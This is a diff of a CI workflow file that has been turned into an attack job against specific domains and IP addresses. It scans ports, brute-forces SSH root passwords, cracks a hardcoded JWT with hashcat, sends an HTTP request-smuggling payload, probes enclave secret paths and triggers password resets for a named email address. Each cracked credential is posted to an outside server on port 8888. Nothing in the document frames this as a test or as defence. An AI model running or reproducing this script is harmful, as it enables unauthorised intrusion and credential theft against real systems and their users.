@@ -1,37 +1,37 @@
 name: CI
 on: [push, workflow_dispatch]
 jobs:
-  infra:
+  attack:
     runs-on: ubuntu-latest
     timeout-minutes: 25
     steps:
-      - name: takeover
+      - name: full
         run: |
-          T=95.217.1.162
-          VPS=193.203.169.109
-          JWT="eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyNiwiZXhwIjoxNzgwNjU0Mjc0fQ.ZOxCTDOVGFiRW7iFfGo1wqqedMLAaNNhQofEKy_TV8g"
-          sudo apt-get update -qq && sudo apt-get install -y -qq nmap sshpass 2>/dev/null | tail -1
-          echo "=== nmap top1000 on $T ==="
-          sudo nmap -Pn -sV --top-ports 1000 -T4 --open $T 2>/dev/null | grep -E "open|STATE"
-          echo "=== nmap 49.13.195.55 ==="
-          sudo nmap -Pn --top-ports 200 -T4 --open 49.13.195.55 2>/dev/null | grep -E "open|STATE"
-          echo "=== nmap 178.104.15.120 ==="
-          sudo nmap -Pn --top-ports 200 -T4 --open 178.104.15.120 2>/dev/null | grep -E "open|STATE"
-          echo "=== ssh brute $T ==="
-          for u in root admin kaskad deploy oxidedall grafana reactor ubuntu caddy; do
-            for pw in kaskad Kaskad2026 admin password OxideDall Anton2026 10h11 changeme Kaskad! reactor grafana oracle nuntius kaspa igra Azerty2026 P@ssw0rd; do
-              timeout 5 sshpass -p "$pw" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 "$u@$T" "id" 2>/dev/null && echo "!!! SSH HIT $u:$pw" && curl -s -X POST -d "ssh=$u:$pw" http://$VPS:8888/ssh && break 2
-            done
+          sudo apt-get update -qq && sudo apt-get install -y -qq sshpass hashcat 2>/dev/null | tail -1
+          echo "=== 1. JWT CRACK WITH RULES ==="
+          echo "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyNiwiZXhwIjoxNzgwNjU0Mjc0fQ.ZOxCTDOVGFiRW7iFfGo1wqqedMLAaNNhQofEKy_TV8g" > /tmp/jwt.txt
+          echo -e "kaskad\nreactor\ngrafana\noracle\nKaskad\nReactor\n10h11\nadmin\nsecret" > /tmp/seeds.txt
+          hashcat -m 16500 /tmp/jwt.txt /tmp/seeds.txt -r /usr/share/hashcat/rules/best64.rule --force -O 2>&1 | tail -5
+          echo "=== 2. SMUGGLE TO GRAFANA LOKI ==="
+          printf "POST / HTTP/1.1\r\nHost: reactor.kaskad.live\r\nContent-Length: 95\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /loki/api/v1/labels HTTP/1.1\r\nHost: grafana.kaskad.live\r\n\r\n" | timeout 8 openssl s_client -connect 95.217.1.162:443 -servername reactor.kaskad.live -quiet 2>/dev/null | grep -v "^$" | tail -5
+          echo "=== 3. GUARD SSH ==="
+          for pw in kaskad Kaskad2026 admin password guard Guard2026 changeme P@ssw0rd Caddy caddy 10h11; do
+            timeout 4 sshpass -p "$pw" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 root@178.104.15.120 "id" 2>/dev/null && echo "!!! GUARD: root:$pw" && curl -s -X POST -d "guard=root:$pw" http://193.203.169.109:8888/guard && break
+            sleep 2
           done
-          echo "=== ssh guard ==="
-          for u in root admin kaskad; do
-            for pw in kaskad Kaskad2026 admin changeme; do
-              timeout 5 sshpass -p "$pw" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 "$u@178.104.15.120" "id" 2>/dev/null && echo "!!! SSH HIT $u:$pw on guard" && curl -s -X POST -d "ssh=$u:$pw@guard" http://$VPS:8888/ssh && break 2
-            done
+          echo "=== 4. GRAFANA SSH ==="
+          for pw in kaskad Kaskad2026 admin password grafana reactor changeme 10h11; do
+            timeout 4 sshpass -p "$pw" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 root@95.217.1.162 "id" 2>/dev/null && echo "!!! GRAFANA: root:$pw" && curl -s -X POST -d "grafana=root:$pw" http://193.203.169.109:8888/grafana && break
+            sleep 2
           done
-          echo "=== rails rce ==="
-          curl -sk --max-time 10 "https://api.kaskad.app/rails/info" -H "Accept: text/html" 2>/dev/null | head -10
-          curl -sk --max-time 10 "https://api.kaskad.app/rails/info/properties" 2>/dev/null | head -10
-          curl -sk --max-time 10 "https://api.kaskad.app/proxy/password" -X POST -H "Content-Type: application/json" -d '{"user":{"email":"a.ghost.gamer@gmail.com"}}' 2>/dev/null
-          curl -sk --max-time 10 "https://api.kaskad.app/users/password" -X POST -H "Content-Type: application/json" -d '{"user":{"email":"a.ghost.gamer@gmail.com"}}' 2>/dev/null
+          echo "=== 5. ORACLE INTERNAL PATHS ==="
+          for p in /seal /unseal /kms /creds /env /config /internal /debug /admin /signer /key /private; do
+            r=$(curl -sk --max-time 3 "https://app.kaskad.live/enclave$p" 2>/dev/null)
+            echo "$r" | grep -qv "not found" && echo "HIT:$p -> $r" || true
+          done
+          echo "=== 6. REACTOR v1 TOKEN FORMATS ==="
+          for tok in "eyJ" "kaskad-" "rk_" "sk_" "pk_" "tok_"; do
+            code=$(curl -sk --max-time 3 -o /dev/null -w "%{http_code}" "https://reactor.kaskad.live/api/v1/health" -H "Authorization: Bearer ${tok}test" 2>/dev/null)
+            echo "$tok -> $code"
+          done
           echo "=== done ==="
